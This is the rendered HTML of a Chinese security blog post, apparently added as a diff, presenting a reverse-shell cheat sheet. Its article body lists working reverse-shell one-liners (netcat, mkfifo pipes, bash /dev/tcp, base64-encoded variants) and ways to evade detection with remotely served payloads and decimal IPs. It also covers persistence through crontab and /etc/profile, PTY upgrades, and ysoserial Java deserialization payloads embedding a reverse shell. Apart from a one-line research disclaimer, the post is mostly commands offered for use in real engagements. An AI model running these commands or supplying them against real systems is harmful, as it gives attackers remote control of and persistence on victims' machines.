@@ -1,0 +1,289 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反弹shell专题 | willsafeのBlog</title><meta name="author" content="willsafe"><meta name="copyright" content="willsafe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="在每个死胡同的尽头，都有另一个维度的天空。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell专题">
+<meta property="og:url" content="http://willsafe.github.io/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/index.html">
+<meta property="og:site_name" content="willsafeのBlog">
+<meta property="og:description" content="在每个死胡同的尽头，都有另一个维度的天空。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imgxz.bizhi3.com/cont/20220810/k13vjp1scff.jpg">
+<meta property="article:published_time" content="2024-08-19T08:50:55.000Z">
+<meta property="article:modified_time" content="2024-08-22T03:39:09.614Z">
+<meta property="article:author" content="willsafe">
+<meta property="article:tag" content="基础知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgxz.bizhi3.com/cont/20220810/k13vjp1scff.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://willsafe.github.io/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: willsafe","link":"链接: ","source":"来源: willsafeのBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '反弹shell专题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-22 11:39:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/icon.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.toopic.cn/public/uploads/small/1712590412910171259041279.png')"><nav id="nav"><span id="blog-info"><a href="/" title="willsafeのBlog"></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">反弹shell专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-19T08:50:55.000Z" title="发表于 2024-08-19 16:50:55">2024-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-22T03:39:09.614Z" title="更新于 2024-08-22 11:39:09">2024-08-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="反弹shell专题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div style="text-align: center;"> <font color="red" size="6" face="Arial">仅用于网络安全研究，请遵守相关法律法规</font> </div>
+
+<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在实战情况下，多数命令执行点，我们都是反弹shell回来进行操作(方便，快捷)，反弹shell即将命令行交给外部去使用</p>
+<h1 id="二、连接方式"><a href="#二、连接方式" class="headerlink" title="二、连接方式"></a>二、连接方式</h1><h2 id="2-1-正向连接"><a href="#2-1-正向连接" class="headerlink" title="2.1 正向连接"></a>2.1 正向连接</h2><p>机器A—-&gt;(层层防护)–&gt;受害机器B<br>即：攻击机A主动去连接受害机器B，这种情况在内网会用，在边界防护太多，面临被ban的风险也大</p>
+<h2 id="2-2-反向连接"><a href="#2-2-反向连接" class="headerlink" title="2.2 反向连接"></a>2.2 反向连接</h2><p>机器A&lt;—-(层层防护)&lt;–受害机器B<br>即：受害机器B主动出来找攻击机A，更容易，原因就是防护严入宽出的原则</p>
+<h1 id="三、姿势总结"><a href="#三、姿势总结" class="headerlink" title="三、姿势总结"></a>三、姿势总结</h1><h2 id="3-1-命令生成站点"><a href="#3-1-命令生成站点" class="headerlink" title="3.1 命令生成站点"></a>3.1 命令生成站点</h2><p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">棱角社区</a><br><a target="_blank" rel="noopener" href="https://tools.zjun.info/hacktools/">hacktools</a><br><a target="_blank" rel="noopener" href="https://cdbc.pythonanywhere.com/">https://cdbc.pythonanywhere.com/</a><br><a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>
+<h2 id="3-2-nc反弹shell"><a href="#3-2-nc反弹shell" class="headerlink" title="3.2 nc反弹shell"></a>3.2 nc反弹shell</h2><p>NC是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p>
+<blockquote>
+<p>安装(有-e参数，而linux系统自带的则无)</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>使用</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash [host] [port]</span><br><span class="line">nc -e /bin/sh [host] [port]</span><br><span class="line"><span class="built_in">mknod</span> backpipe p &amp;&amp; nc [host] [port] 0&lt;backpipe | /bin/bash 1&gt;backpipe    //会产生一个文件(不推荐)</span><br></pre></td></tr></table></figure>
+<p>nc老版本问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当nc版本问题时：</span><br><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc [host] [port] &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<h2 id="3-3-bash"><a href="#3-3-bash" class="headerlink" title="3.3 bash"></a>3.3 bash</h2><p>最好用的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;</span></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>编码&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"><span class="built_in">base64</span>编码为bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</span><br><span class="line">- bash -i : 产生一个 bash 交互环境</span><br><span class="line">- `&gt;&amp;` : 将联合符号前面的内容与后面相结合，然后一起重定向给后者</span><br><span class="line">- `/dev/tcp/IP/PORT` : 让目标主机与攻击机的端口建立一个tcp连接</span><br><span class="line">- `0&gt;&amp;1` : 将标准输入与标准输出的内容相结合然后重定向给前面标准输出的内容</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/image-20240819175136200.png"></p>
+<blockquote>
+<p>绕过检测</p>
+</blockquote>
+<p>在VPS上启一个web服务(<code>python3 -m http.server [port] -d .</code>)，放index.html，内容如<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code><br><img src="/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/image-20240819180424237.png"></p>
+<blockquote>
+<p>还有是绕过IP检测和一些编码符号问题</p>
+</blockquote>
+<p><img src="/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/image-20240819181749791.png"></p>
+<blockquote>
+<p>十进制IP绕过</p>
+</blockquote>
+<p>原始：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.40.20&#x2F;8888 0&gt;&amp;1<br>变形：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;3232245780&#x2F;8888 0&gt;&amp;1</p>
+<h2 id="3-4-计划任务反弹shell"><a href="#3-4-计划任务反弹shell" class="headerlink" title="3.4 计划任务反弹shell"></a>3.4 计划任务反弹shell</h2><p>反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code>或者<code>/etc/crontab</code>，所以必须要知道远程主机当前的用户名。否则将不会被执行。</p>
+<ul>
+<li>当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)</li>
+<li>当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian&#x2F;Ubuntu系列主机)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*   *　 *　 *　 *　　<span class="built_in">command</span></span><br><span class="line">分　时　日　月　周　 命令</span><br><span class="line"></span><br><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/IP/PORT  0&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="3-5-profile文件反弹shell"><a href="#3-5-profile文件反弹shell" class="headerlink" title="3.5 profile文件反弹shell"></a>3.5 profile文件反弹shell</h2><p><code>/etc/profile</code>中的内容会在用户打开 bash 窗口时执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1 &amp;  </span><br><span class="line"><span class="comment"># 最后面那个&amp;是后台运行，并不会卡住</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-6-交互式切换"><a href="#3-6-交互式切换" class="headerlink" title="3.6 交互式切换"></a>3.6 交互式切换</h2><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><code>/usr/bin/script -qc /bin/bash /dev/null</code></p>
+<h2 id="3-7-其他"><a href="#3-7-其他" class="headerlink" title="3.7 其他"></a>3.7 其他</h2><blockquote>
+<p>其他语言和工具的去命令生成站点看即可</p>
+</blockquote>
+<h1 id="四、java反序列化-反弹shell"><a href="#四、java反序列化-反弹shell" class="headerlink" title="四、java反序列化(反弹shell)"></a>四、java反序列化(反弹shell)</h1><h2 id="4-1-yso工具的使用"><a href="#4-1-yso工具的使用" class="headerlink" title="4.1 yso工具的使用"></a>4.1 yso工具的使用</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">工具下载直达</a><br><code>java -jar ysoserial-all.jar 要打的链子 &quot;命令&quot; |base64 -w0</code><br><code>-w0</code> 是让它不要换行<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQwLjIwLzEyMzQgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br><code>&quot;nc xxx xx -e /bin/bash&quot;</code></p>
+<h2 id="4-2-POC经常弹失败？"><a href="#4-2-POC经常弹失败？" class="headerlink" title="4.2 POC经常弹失败？"></a>4.2 POC经常弹失败？</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ae3922db1f70">来自Z1ng3r师傅的详解</a><br>总结：在java反序列化带入命令RCE时，由于是代码去处理，所以环境不同，不像直接在shell执行那样，如：参数分割、参数解析的问题<br>建议用下面这种</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQwLjIwLzEyMzQgMD4mIDE&#125;|&#123; base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://willsafe.github.io">willsafe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://willsafe.github.io/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/">http://willsafe.github.io/2024/08/19/反弹shell专题/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://willsafe.github.io" target="_blank">willsafeのBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></div><div class="post_share"><div class="social-share" data-image="https://imgxz.bizhi3.com/cont/20220810/k13vjp1scff.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/27/morpheus/" title="morpheus"><img class="cover" src="https://www.toopic.cn/public/uploads/small/1724242307895172424230713.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">morpheus</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/13/RMI%E4%B8%93%E9%A2%98/" title="RMI专题"><img class="cover" src="https://img3.wallspic.com/previews/5/2/7/6/7/176725/176725-qi_fen-zhe_ge_xing_qiu-guang-yue_liang-tian_wen_xue_dui_xiang-x750.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">RMI专题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/12/13/Windows-Linux/" title="Windows&amp;&amp;Linux"><img class="cover" src="https://pic.pngsucai.com/00/87/37/c4f6b7b5f8fb1928.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-13</div><div class="title">Windows&amp;&amp;Linux</div></div></a></div><div><a href="/2024/04/10/java%E5%9F%BA%E7%A1%80/" title="java基础"><img class="cover" src="https://imgxz.bizhi3.com/cont/20220810/rea2pvlz2wf.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-10</div><div class="title">java基础</div></div></a></div><div><a href="/2024/03/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="应急响应"><img class="cover" src="https://imgxz.bizhi3.com/cont/20220811/le5ejhxsasn.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-11</div><div class="title">应急响应</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">willsafe</div><div class="author-info__description">如果你赶不上凌晨5点的日出,不妨看看傍晚6点的夕阳</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/willsafe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/qq.png" target="_blank" title="QQ"><i class="iconfont icon-qq"></i></a><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont icon-weixin"></i></a><a class="social-icon" href="/img/github.png" target="_blank" title="Github"><i class="iconfont icon-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">二、连接方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">2.1 正向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">2.2 反向连接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"><span class="toc-text">三、姿势总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E7%AB%99%E7%82%B9"><span class="toc-text">3.1 命令生成站点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-nc%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.2 nc反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-bash"><span class="toc-text">3.3 bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.4 计划任务反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-profile%E6%96%87%E4%BB%B6%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">3.5 profile文件反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-%E4%BA%A4%E4%BA%92%E5%BC%8F%E5%88%87%E6%8D%A2"><span class="toc-text">3.6 交互式切换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E5%85%B6%E4%BB%96"><span class="toc-text">3.7 其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">四、java反序列化(反弹shell)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-yso%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">4.1 yso工具的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-POC%E7%BB%8F%E5%B8%B8%E5%BC%B9%E5%A4%B1%E8%B4%A5%EF%BC%9F"><span class="toc-text">4.2 POC经常弹失败？</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/08/27/morpheus/" title="morpheus"><img src="https://www.toopic.cn/public/uploads/small/1724242307895172424230713.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="morpheus"/></a><div class="content"><a class="title" href="/2024/08/27/morpheus/" title="morpheus">morpheus</a><time datetime="2024-08-27T02:55:27.000Z" title="发表于 2024-08-27 10:55:27">2024-08-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/" title="反弹shell专题"><img src="https://imgxz.bizhi3.com/cont/20220810/k13vjp1scff.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell专题"/></a><div class="content"><a class="title" href="/2024/08/19/%E5%8F%8D%E5%BC%B9shell%E4%B8%93%E9%A2%98/" title="反弹shell专题">反弹shell专题</a><time datetime="2024-08-19T08:50:55.000Z" title="发表于 2024-08-19 16:50:55">2024-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/13/RMI%E4%B8%93%E9%A2%98/" title="RMI专题"><img src="https://img3.wallspic.com/previews/5/2/7/6/7/176725/176725-qi_fen-zhe_ge_xing_qiu-guang-yue_liang-tian_wen_xue_dui_xiang-x750.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RMI专题"/></a><div class="content"><a class="title" href="/2024/08/13/RMI%E4%B8%93%E9%A2%98/" title="RMI专题">RMI专题</a><time datetime="2024-08-13T03:41:40.000Z" title="发表于 2024-08-13 11:41:40">2024-08-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" 